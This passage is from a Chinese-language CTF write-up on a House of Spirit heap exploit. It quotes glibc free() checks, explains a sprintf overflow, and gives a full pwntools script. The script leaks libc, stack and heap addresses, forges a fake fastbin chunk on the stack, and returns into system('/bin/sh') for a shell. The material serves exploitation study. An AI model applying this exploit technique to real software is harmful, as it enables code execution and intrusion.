class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>的<code>size</code>大小需要满足对应的fastbin的需求，同时也得对齐。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">size</span> &lt; MINSIZE || !aligned_OK (<span class="built_in">size</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>的<code>next chunk</code>的大小不能小于<code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">    of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">    after getting the lock.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock || </span><br><span class="line">        (&#123; </span><br><span class="line">            assert (locked == <span class="number">0</span>); </span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ || chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>对应的fastbin链表头部不能是该<code>fake chunk</code>，即不能构成double free的情况。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">    (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">    size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">    only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">    deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old;</span><br><span class="line">&#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure></li></ul><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li>乍一眼看过去好像没什么洞，发现问题出在<code>sprintf</code>中，<code>v1</code>分配的大小是0x38，当<code>cnt</code>是两位数的时候，字符串长度正好是0x38，导致<code>nbytes</code>被覆盖为0，那么只要cnt为三位数，就可以将<code>cnt</code>覆盖为<code>ord(&#39;n&#39;)=0x6e</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v1; <span class="comment">// [sp+10h] [bp-E8h]@2</span></span><br><span class="line"><span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+48h] [bp-B0h]@1</span></span><br><span class="line"><span class="keyword">size_t</span> v3; <span class="comment">// [sp+4Ch] [bp-ACh]@1</span></span><br><span class="line"><span class="keyword">char</span> s; <span class="comment">// [sp+50h] [bp-A8h]@2</span></span><br><span class="line"><span class="keyword">int</span> v5; <span class="comment">// [sp+A0h] [bp-58h]@2</span></span><br><span class="line"><span class="keyword">void</span> *buf; <span class="comment">// [sp+A4h] [bp-54h]@2</span></span><br><span class="line"><span class="keyword">int</span> v7; <span class="comment">// [sp+A8h] [bp-50h]@2</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</span><br></pre></td></tr></table></figure></li><li>那么对应的对<code>s</code>的输入可以溢出到<code>v5</code>和<code>buf</code>，这里可以将栈上的libc，stack以及heap address全部都leak出来：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br></pre></td></tr></table></figure></li><li>地址leak出来之后，就可以在栈上<code>v7</code>的区域伪造出fake fastbin以及next chunk size，之后它会被<code>free</code>到fastbin中</li><li>下一次的malloc就能分配到栈上的地址空间，由于这个时候<code>nbytes=0x68</code>，并且这个fake chunk距离栈上的return address的offset只有0x4c，所以这里我采用的是写rop的方法，构造<code>system(&quot;/bin/sh&quot;);</code>，从而在从<code>survey</code>返回地时候触发来getshell。</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">survey</span><span class="params">(name, age, reason, comment)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">""</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Please enter your name: "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter your age: "</span>, str(age))</span><br><span class="line">    p.sendafter(<span class="string">"Why did you came to see this movie? "</span>, reason)</span><br><span class="line">    <span class="keyword">if</span> comment != <span class="string">""</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Please enter your comment: "</span>, comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>, choice)</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">heap_offset = <span class="number">0x410</span></span><br><span class="line">stack_offset = <span class="number">0x1eaf8</span></span><br><span class="line">stdout_offset = <span class="number">0x1b0d60</span></span><br><span class="line">ebp_offset = <span class="number">0x1ead8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make cnt to 100</span></span><br><span class="line"><span class="comment"># thus, overwrite the value of 'nbytes' to ord('n') </span></span><br><span class="line"><span class="comment"># because len("100 comment so far. We will review them as soon as we can") will be 57</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    survey(<span class="string">"AAAA"</span>, <span class="number">1</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">    keep(<span class="string">"y"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    survey(<span class="string">""</span>, <span class="number">1</span>, <span class="string">"AAAA"</span>, <span class="string">""</span>)</span><br><span class="line">    keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap, stack and libc address</span></span><br><span class="line">survey(<span class="string">"BBBB"</span>, <span class="number">1</span>, <span class="string">"B"</span> * <span class="number">0x4b</span> + <span class="string">"stack"</span>, <span class="string">"B"</span> * <span class="number">0x50</span> + <span class="string">"heap"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heap"</span>)</span><br><span class="line">heap_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">heap_base = heap_addr - heap_offset</span><br><span class="line">p.recvuntil(<span class="string">"stack"</span>)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">stack_base = stack_addr - stack_offset</span><br><span class="line">stack_ebp = stack_base + ebp_offset</span><br><span class="line">libc_stdout = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</span><br><span class="line">libc_base = libc_stdout - stdout_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake a fastbin near return address</span></span><br><span class="line"><span class="comment"># make sure the next chunk size can pass the check</span></span><br><span class="line"><span class="comment"># survey("CCCC", 1, p32(0) + p32(0x41) + "C" * 0x40 + p32(0) + p32(0x41), "C" * 0x54 + p32(stack_ebp - 0x40))</span></span><br><span class="line"><span class="comment"># keep("y")</span></span><br><span class="line">survey(<span class="string">"CCCC"</span>, <span class="number">1</span>, p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">"C"</span> * <span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>), <span class="string">"C"</span> * <span class="number">0x54</span> + p32(stack_ebp - <span class="number">0x48</span>))</span><br><span class="line">keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite return address to construct rop chain</span></span><br><span class="line">payload = <span class="string">"D"</span> * <span class="number">0x48</span></span><br><span class="line">payload += flat([<span class="number">0xdeadbeef</span>, libc_system, <span class="number">0xdeadbeef</span>, str_bin_sh])</span><br><span class="line">survey(payload, <span class="number">1</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">keep(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"stack_base: "</span> + hex(stack_base))</span><br><span class="line">success(<span class="string">"stack_ebp: "</span> + hex(stack_ebp))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>很基本的House of spirit attack，主要是了解一下原理以及一些check的pass</li><li>我能想到的最简单的就是rop了，不知道还有没有其他姿势</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>都是House of spirit的原理分析：</p><ol><li><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a></li><li><a href="https://www.cnblogs.com/luoleqi/p/12357190.html" target="_blank" rel="noopener">https://www.cnblogs.com/luoleqi/p/12357190.html</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;House of spirit attack，题目名字说明了一切。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
